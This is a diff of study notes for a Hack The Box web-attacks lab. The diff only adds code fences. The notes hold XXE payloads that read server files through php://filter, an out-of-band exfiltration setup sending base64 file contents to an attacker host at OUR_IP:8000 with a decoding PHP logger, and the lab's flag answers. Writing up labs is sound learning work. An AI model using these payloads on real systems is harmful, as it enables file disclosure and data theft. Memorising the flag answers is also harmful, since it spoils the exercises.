@@ -71,7 +71,7 @@ IDOR caused by the improper access control on the back-end servers.
 Answer: UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg
 
 Explanation: 
-
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
@@ -81,7 +81,7 @@ Explanation:
 <email>&company;</email>
 <message>I feel this</message>
 </root>
-
+```
 # Advanced File Disclosure
 1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').
 
@@ -91,7 +91,7 @@ Explnation:
 
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 python3 -m http.server 8000
-
+```
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
   <!ENTITY % file SYSTEM "file:///flag.php"> <!-- reference external file -->
@@ -99,7 +99,7 @@ python3 -m http.server 8000
   <!ENTITY % xxe SYSTEM "http://IP:8000/xxe.dtd"> <!-- reference our external DTD -->
   %xxe;
 ]>
-
+```
 <email>&joined;</email>
 
 # Blind Data Exfiltration
@@ -120,16 +120,18 @@ and then, to decode the shown content that will be in the open server output:
  
 php file: index.php
 
+```
 <?php
 if(isset($_GET['content'])){
     error_log("\n\n" . base64_decode($_GET['content']));
 }
-?>
+?> 
+```
 
 php -S 0.0.0.0:8000
 
 The XXE xml payload:
-
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
@@ -137,7 +139,7 @@ The XXE xml payload:
   %oob;
 ]>
 <root>&content;</root>
-
+```
 # Skill Assessment
 
 1. First, there is an api path: GET /api.php/user/74 that is authenticated with given credentials. 
@@ -181,7 +183,7 @@ DNT: 1
 Connection: close
 Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=52
 Sec-GPC: 1
-
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
     <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
@@ -190,5 +192,5 @@ Sec-GPC: 1
             <details>qwerqwer</details>
             <date>2025-02-20</date>
             </root>
-
+```
 Answer: HTB{m4573r_w3b_4774ck3r}
